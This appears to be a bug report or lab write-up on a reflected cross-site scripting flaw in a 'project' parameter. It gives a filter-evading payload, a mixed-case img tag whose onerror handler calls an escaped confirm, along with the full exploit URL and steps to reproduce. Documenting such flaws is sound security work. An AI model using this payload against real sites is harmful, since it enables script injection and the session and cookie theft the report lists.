# Reflected Cross-Site Scripting (XSS) via `project` Parameter

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the `project` parameter of the application. User-supplied input is reflected into the HTML response without proper sanitization or output encoding, allowing arbitrary JavaScript execution in the victim’s browser.

---

## Vulnerable Endpoint

```text id="f0x9ke"
http://kzlabs.com/punishment/15.php?project=%3CiMg%20src=x%20onerror=\u0063onfirm?.(1)%3E
```

---

## Vulnerable Parameter

```text id="v5w8nz"
project
```

---

## Payload Used

```html id="c4t7rq"
<iMg src=x onerror=\u0063onfirm?.(1)>
```

---

## Steps to Reproduce

1. Open the vulnerable URL:

   ```text
   http://kzlabs.com/punishment/15.php?project=%3CiMg%20src=x%20onerror=\u0063onfirm?.(1)%3E
   ```

2. Observe that the payload is reflected in the response.

3. The JavaScript executes automatically and triggers a popup.

---

## Proof of Concept

```text id="z1m6ph"
http://kzlabs.com/punishment/15.php?project=%3CiMg%20src=x%20onerror=\u0063onfirm?.(1)%3E
```

### Screenshot

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/e4e6c1ab-f608-48fd-b97d-494739655279" />


---

## Impact

* Session hijacking
* Cookie theft
* JS execution

---

## Recommendations for Fix

* Encode output
* Validate input
* Secure rendering
